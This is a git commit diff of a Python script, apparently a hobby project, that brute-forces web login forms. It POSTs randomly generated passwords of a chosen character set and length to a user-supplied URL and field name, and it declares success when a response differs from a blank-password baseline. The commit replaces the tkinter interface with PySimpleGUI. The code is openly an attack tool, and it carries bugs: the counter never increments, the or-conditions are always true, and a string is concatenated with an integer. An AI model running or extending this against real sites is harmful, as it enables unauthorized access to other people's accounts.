ff80babfebe51850283ed2e614adfa53d8177f96
portaltree <66620496+asimo10@users.noreply.github.com>
2021-04-16 19:42:16 +0900

    Update bruteforce.py

--- bruteforce/bruteforce.py
+++ bruteforce/bruteforce.py
@@ -8,82 +8,66 @@
 # D = digits aka numbers
 import requests
 from password_generator import PasswordGenerator
-import tkinter as tk
-from tkinter import messagebox
+import PySimpleGUI as sg
 
-f = open("html.txt", "w")
-f.write("")
-f.close()
+layout = [
+    [sg.Text('URL', size=(11, 1)), sg.InputText('', size=(23, 1))],
+    [sg.Text('Value', size=(11, 1)), sg.InputText('', size=(23, 1))],
+    [sg.Text('Length', size=(11, 1)), sg.InputText('', size=(23, 1))],
+    [sg.Text('Param', size=(11, 1)), sg.InputText('', size=(23, 1))],
+    [sg.Submit(button_text='go')]
+]
 
-win = tk.Tk()
+window = sg.Window('Brute Force', layout)
 
-win.title("Brute Force")
-win.geometry("480x300")
-win.configure(bg="gray")
-
-text1 = tk.Entry(win)
-text1.insert(tk.END, "Char")
-text1.place(x=50, y=70)
-
-text2 = tk.Entry(win)
-text2.insert(tk.END, "URL")
-text2.place(x=50, y=110)
-
-text3 = tk.Entry(win)
-text3.insert(tk.END, "Length")
-text3.place(x=300, y=70)
-
-text4 = tk.Entry(win)
-text4.insert(tk.END, "Key")
-text4.place(x=300, y=110)
-
-def click_Onbutton():
-  global char
-  global url
-  global length
-  global key
-  char = text1.get()
-  url = text2.get()
-  length = int(text3.get())
-  key = text4.get()
-  bruteforce()
-
-button = tk.Button(win, text="GO", font=("", 20), command=click_Onbutton)
-button.place(x=210, y=150)
-
-def gen(i):
+def gen(i, param):
   pwo = PasswordGenerator()
-  if char == "U":
+  if param == "U":
     return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZ', i)
-  elif char == "L":
+  elif param == "L":
     return pwo.shuffle_password('abcdefghijklmnopqrstuvwxyz', i)
-  elif char == "D":
+  elif param == "D":
     return pwo.shuffle_password('1234567890', i)
-  elif char == "LD" or "DL":
+  elif param == "LD" or "DL":
     return pwo.shuffle_password('abcdefghijklmnopqrstuvwxyz1234567890', i)
-  elif char == "UD" or "DU":
+  elif param == "UD" or "DU":
     return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', i)
-  elif char == "UL" or "LU":
+  elif param == "UL" or "LU":
     return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', i)
   else:
-    return pwo.shuffle_password(i)
+    return pwo.shuffle_password("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890", i)
 
-def bruteforce():
+def bruteforce(url, value, length, param):
   count = 0
   while True:
-    pas = gen(length)
+    pas = gen(length, param)
     print(pas)
-    message = {key: pas}
+    message = {value: pas}
     req = requests.post(url, data=message)
-    message2 = {key: " "}
+    message2 = {value: " "}
     get = requests.post(url, data=message2)
     count +1
     if get.text != req.text:
       print("---------------")
       print(req)
       print("Password: ", pas, "Count: ", count)
-      messagebox.showinfo("Success", "Found password: " + pas)
+      print("Success", "Found password: " + pas, "after" + count + "times")
 
       break
 
-win.mainloop()
+while True:
+    event, values = window.read()
+
+    if event is None:
+      print('exit')
+      break
+
+    if event == "go":
+      url = values[0]
+      value = values[1]
+      length = int(values[2])
+      param = values[3]
+      
+      bruteforce(url, value, length, param)
+
+window.close()
